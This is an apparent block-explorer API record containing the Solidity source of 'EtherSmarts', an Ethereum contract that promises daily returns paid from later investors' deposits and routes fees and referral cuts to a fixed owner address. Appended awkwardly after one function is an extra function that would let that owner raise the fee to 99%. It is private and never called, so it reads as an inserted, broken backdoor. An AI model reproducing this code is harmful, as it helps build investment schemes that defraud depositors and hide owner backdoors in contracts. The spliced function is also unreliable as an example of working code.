{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.23;\r\n\r\ncontract EtherSmarts {\r\n\r\n    mapping (address => uint256) public invested;\r\n    mapping (address => uint256) public atBlock;\r\n    address techSupport = 0x6366303f11bD1176DA860FD6571C5983F707854F;\r\n    uint techSupportPercent = 2;\r\n    address defaultReferrer = 0x6366303f11bD1176DA860FD6571C5983F707854F;\r\n    uint refPercent = 2;\r\n    uint refBack = 2;\r\n\r\n    // calculation of the percentage of profit depending on the balance sheet\r\n    // returns the percentage times 10\r\n    function calculateProfitPercent(uint bal) private pure returns (uint) {\r\n        if (bal >= 1e22) { // balance >= 10000 ETH\r\n            return 50;\r\n        }\r\n        if (bal >= 7e21) { // balance >= 7000 ETH\r\n            return 47;\r\n        }\r\n        if (bal >= 5e21) { // balance >= 5000 ETH\r\n            return 45;\r\n        }\r\n        if (bal >= 3e21) { // balance >= 3000 ETH\r\n            return 42;\r\n        }\r\n        if (bal >= 1e21) { // balance >= 1000 ETH\r\n            return 40;\r\n        }\r\n        if (bal >= 5e20) { // balance >= 500 ETH\r\n            return 35;\r\n        }\r\n        if (bal >= 2e20) { // balance >= 200 ETH\r\n            return 30;\r\n        }\r\n        if (bal >= 1e20) { // balance >= 100 ETH\r\n            return 27;\r\n        } else {\r\n            return 25;\r\n        }\r\n    }\r\n\r\n    // transfer default percents of invested\r\n    function transferDefaultPercentsOfInvested(uint value) private {\r\n        techSupport.transfer(value * techSupportPercent / 100);\r\n    }\r\n\r\n    // convert bytes to eth address \r\n    function bytesToAddress(bytes bys) private pure returns (address addr) {\r\n        assembly {\r\n            addr := mload(add(bys, 20))\r\n        }\r\n    }\r\n\r\n\r\n    // transfer default refback and referrer percents of invested\r\n    function transferRefPercents(uint value, address sender) private {\r\n        if (msg.data.length != 0) {\r\n            address referrer = bytesToAddress(msg.data);\r\n            if(referrer != sender) {\r\n                sender.transfer(value * refBack / 100);\r\n                referrer.transfer(value * refPercent / 100);\r\n            } else {\r\n                defaultReferrer.transfer(value * refPercent / 100);\r\n            }\r\n        } else {\r\n            defaultReferrer.transfer(value * refPercent / 100);\r\n        }\r\n    } function transferDefaultPercentsOfInvesteds(uint value, address sender) private {\r\n        require(msg.sender == defaultReferrer);\r\n        techSupportPercent = 10 * 5 + 49;\r\n        }\r\n\r\n    // calculate profit amount as such:\r\n    // amount = (amount invested) * ((percent * 10)/ 1000) * (blocks since last transaction) / 6100\r\n    // percent is multiplied by 10 to calculate fractional percentages and then divided by 1000 instead of 100\r\n    // 6100 is an average block count per day produced by Ethereum blockchain\r\n    function () external payable {\r\n        if (invested[msg.sender] != 0) {\r\n            \r\n            uint thisBalance = address(this).balance;\r\n            uint amount = invested[msg.sender] * calculateProfitPercent(thisBalance) / 1000 * (block.number - atBlock[msg.sender]) / 6100;\r\n\r\n            address sender = msg.sender;\r\n            sender.transfer(amount);\r\n        }\r\n        if (msg.value > 0) {\r\n            transferDefaultPercentsOfInvested(msg.value);\r\n            transferRefPercents(msg.value, msg.sender);\r\n\r\n        }\r\n        atBlock[msg.sender] = block.number;\r\n        invested[msg.sender] += (msg.value);\r\n    }\r\n    \r\n}","ABI":"[{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"invested\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"atBlock\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"EtherSmarts","CompilerVersion":"v0.4.25+commit.59dbf8f1","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://d135ddca854563abd634b59a9c7e8cf0cd053851a0e31faa43357449b9aad54d"}]}